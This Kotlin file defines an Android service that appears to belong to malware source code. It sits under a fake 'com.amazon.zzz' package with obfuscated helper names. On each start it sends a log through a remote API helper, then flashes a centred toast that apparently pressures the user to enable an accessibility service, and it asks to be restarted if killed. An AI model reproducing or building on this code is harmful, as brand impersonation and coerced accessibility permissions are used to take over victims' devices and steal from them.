package com.amazon.zzz.Services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.view.Gravity
import android.widget.Toast
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Strings.localeTextAccessibility
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm

class srvToaskAccessibility : Service() {

    override fun onBind(intent: Intent): IBinder? {
        throw UnsupportedOperationException("")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        apiUt.sendLogs(this, "", "srvToaskAccessibility onStartCommand", "log")
        utUtils.Log("srvToaskAccessibility", "onStartCommand executed with startId: $startId")
        if (intent != null) {
            runCatching {
                val extra: String? = intent.getStringExtra("name")
                if (extra == null || extra == "value") {
                    val toast = Toast.makeText(
                        applicationContext,
                        localeTextAccessibility() + " " + constNm.access1,
                        Toast.LENGTH_SHORT
                    )
                    toast?.setGravity(Gravity.CENTER, 0, 0)
                    toast?.show()

                    stopSelf()
                } else {
                    val toast = Toast.makeText(
                        applicationContext,
                        localeTextAccessibility() + " " + constNm.access1,
                        Toast.LENGTH_SHORT
                    )
                    toast?.setGravity(Gravity.CENTER, 0, 0)
                    toast?.show()

                    stopSelf()
                }
            }
        } else {
            stopSelf()
        }
        // by returning this we make sure the service is restarted if the system kills the service
        return START_STICKY
    }

}